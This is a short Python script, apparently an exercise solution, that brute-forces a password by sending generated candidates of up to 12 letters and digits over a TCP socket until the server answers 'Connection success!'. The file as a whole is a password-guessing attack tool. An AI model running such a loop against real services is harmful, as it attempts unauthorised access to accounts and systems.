import socket
import sys
from itertools import combinations_with_replacement, permutations, chain
from string import digits, ascii_letters


def run(host, port, passwords):
    with socket.socket() as st:
        st.connect((host, port))
        for password in passwords:
            st.send(password.encode())
            if st.recv(1024).decode() == "Connection success!":
                return password


def password_gen(pass_max_len):
    ch = chain()
    for i in range(1, pass_max_len + 1):
        ch = chain(*ch, digits, ascii_letters)
        for c in combinations_with_replacement(ch, i):
            for p in permutations(c, i):
                yield "".join(p)


print(run(sys.argv[1], int(sys.argv[2]), password_gen(12)))
